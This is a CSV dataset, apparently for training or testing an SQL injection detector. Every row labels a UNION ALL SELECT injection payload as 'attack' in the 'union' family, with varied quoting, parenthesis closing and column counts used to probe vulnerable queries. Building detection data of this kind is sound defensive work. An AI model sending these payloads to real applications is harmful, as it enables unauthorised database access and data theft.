label,payload,family
attack,"1'||  (  select 'fqoz' where 9794  =  9794 union all select null,null,null,null,null--",union
attack,"-4329'  )   union all select 1353,1353,1353,1353,1353,1353#",union
attack,"-8695 union all select 6087,6087,6087,6087,6087,6087,6087,6087,6087,6087#",union
attack,"-3031"" union all select 2681#",union
attack,"-5143'+  (  select 'zyrr' where 8405  =  8405 union all select 8405,8405,8405,8405#",union
attack,"-8200' in boolean mode  )   union all select 3360,3360--",union
attack,"-3767'  )   as eefl where 8260  =  8260 union all select 8260,8260,8260,8260,8260,8260,8260#",union
attack,"-6548%""  )   union all select 6067,6067,6067,6067,6067,6067,6067,6067,6067--",union
attack,"-9569%'   )    )    union all select 8405,8405,8405,8405--",union
attack,"-6457 where 1764  =  1764 union all select 1764,1764,1764,1764,1764,1764,1764,1764--",union
attack,"-1748%""   )    )     )   union all select 2987#",union
attack,"1%""   )    )     )   union all select null,null,null,null,null,null,null#",union
attack,1'||  (  select 'puco' where 2605  =  2605 union all select null#,union
attack,"-4797' union all select 8223,8223,8223,8223,8223,8223,8223,8223#",union
attack,"1'||  (  select 'jonh' from dual where 2415  =  2415 union all select null,null,null,null,null,null,null,null,null--",union
attack,"-9023%""   )    )     )   union all select 4490,4490,4490#",union
attack,"1%' union all select null,null,null,null,null,null,null,null#",union
attack,"-9928""   )    )    union all select 7511,7511,7511,7511,7511,7511,7511,7511#",union
attack,"-2909'||  (  select 'qfeq' where 7062  =  7062 union all select 7062,7062,7062,7062,7062,7062--",union
attack,"1""   )    )    as nbdc where 4444  =  4444 union all select null,null--",union
attack,"-7656""   )    )     )   union all select 3172,3172,3172,3172,3172,3172,3172,3172,3172,3172--",union
attack,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null--",union
attack,1'||  (  select 'lxyu' from dual where 5789  =  5789 union all select null#,union
attack,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null#",union
attack,"1"" where 6325  =  6325 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-8654' union all select 7190,7190,7190,7190,7190#",union
attack,"1'   )    )    union all select null,null,null#",union
attack,"1   )    )     )   union all select null,null,null,null#",union
attack,"1' union all select null,null,null,null,null,null,null,null,null#",union
attack,"-6335""   )    )     )   union all select 3654--",union
attack,"-2197' union all select 8065,8065,8065,8065--",union
attack,1   )    )     )   union all select null--,union
attack,"-4586 union all select 2068,2068,2068,2068--",union
attack,"1""   )    )    union all select null,null#",union
attack,"-1504""  )   as wpes where 6256  =  6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#",union
attack,"-9150%'   )    )     )   union all select 7057,7057,7057,7057,7057,7057,7057,7057--",union
